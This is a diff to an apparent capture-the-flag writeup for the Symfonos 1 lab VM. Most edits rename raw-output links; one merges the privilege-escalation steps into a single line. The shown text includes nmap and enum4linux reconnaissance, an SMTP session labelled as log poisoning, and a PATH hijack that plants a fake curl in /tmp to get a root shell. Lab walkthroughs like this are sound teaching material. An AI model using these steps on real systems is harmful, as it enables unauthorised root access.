@@ -15,7 +15,7 @@ status: "complete"
 
 <TerminalOutput
   cmd="nmap -A -T5 10.0.0.19"
-  rawHref="/writeups/raw/symfonos-1/nmap.txt"
+  rawHref="/writeups/raw/symfonos-1/nmap"
   output={`PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
 25/tcp  open  smtp        Postfix smtpd
@@ -32,7 +32,7 @@ SSH, SMTP, HTTP, and SMB. The SMTP port is interesting — comes into play later
 
 <TerminalOutput
   cmd="enum4linux 10.0.0.19"
-  rawHref="/writeups/raw/symfonos-1/enum4linux.txt"
+  rawHref="/writeups/raw/symfonos-1/enum4linux"
   output={`user:[helios] rid:[0x3e8]
 
 Sharename       Type      Comment
@@ -114,7 +114,7 @@ Port 25 is Postfix, and it accepts mail for `helios@symfonos.localdomain`. Conne
 
 <TerminalOutput
   cmd="telnet 10.0.0.19 25"
-  rawHref="/writeups/raw/symfonos-1/smtp-poison.txt"
+  rawHref="/writeups/raw/symfonos-1/smtp-poison"
   output={`220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
 EHLO test
 250 symfonos.localdomain
@@ -209,17 +209,11 @@ ocalhostH`}
 
 It calls `curl -I http://localhost` — but without the full path. That means it relies on `PATH` to find `curl`, which we control.
 
-Create a fake `curl` that spawns a shell:
+Create a fake `curl` that spawns a shell, prepend `/tmp` to PATH, then run the binary:
 
 <TerminalOutput
-  cmd="echo '#!/bin/sh' > /tmp/curl && echo '/bin/sh' >> /tmp/curl && chmod +x /tmp/curl"
-  output={``}
-/>
-
-Prepend `/tmp` to PATH so our fake curl takes priority, then run the binary:
-
-<TerminalOutput
-  cmd="export PATH=/tmp:$PATH && /opt/statuscheck"
+  cmd="echo '#!/bin/sh' > /tmp/curl && echo '/bin/sh' >> /tmp/curl && chmod +x /tmp/curl && export PATH=/tmp:$PATH && /opt/statuscheck"
+  rawHref="/writeups/raw/symfonos-1/path-hijack"
   output={`# whoami
 root`}
 />
